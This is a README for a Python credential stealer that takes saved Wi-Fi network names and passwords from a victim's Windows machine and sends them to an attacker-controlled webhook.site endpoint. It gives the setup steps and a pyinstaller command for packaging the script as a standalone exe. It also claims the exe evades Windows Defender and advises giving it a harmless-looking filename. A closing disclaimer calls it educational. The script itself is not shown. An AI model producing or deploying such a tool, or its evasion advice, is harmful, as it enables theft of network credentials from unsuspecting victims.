Python Script that Steal Wifi SSID & Passwords from the victims Windows OS.

Tested on Windows 10/11 (x64)
Antivirus: Windows Defender (No Detection)

<b>Requirements:</b>
Python 3.x

<b>How to use:</b>
1. Open <i>wifi-python-webhook.py</i> in any code editor.
2. Replace <b>'WEBHOOK ID'</b> with your own. (You can get it simply from https://webhook.site)
3. Save the file

<b>Run the command:</b>
python wifi-python-webhook.py

<b>To create .exe file use the following command:</b>
pyinstaller --onefile --onefile --distpath . --specpath . --workpath . --name <your-filename-without-extension> wifi-python-webhook.py

The above command will bind python interpreter and every dependency within the exe file. This way Windows Defender will not consider it malicious exe.
Also try not to make the filename look malicious.
<br><br>
<hr>
⚠️ <b>DISCLAIMER</b><br>

This Python script is intended strictly for **educational and authorized penetration testing** purposes only.

You are solely responsible for how you use this code. Unauthorized access to Wi-Fi networks is illegal and unethical. 
By using this tool, you agree that:

- You have explicit written permission to test the network.
- You will not use this code for any unauthorized or malicious activities.
- You comply with all local laws, regulations, and ethical hacking guidelines.

The creator of this script is **not responsible** for any damage, misuse, or legal consequences arising from its use.

🔐 Always hack ethically. Test responsibly. Learn securely.
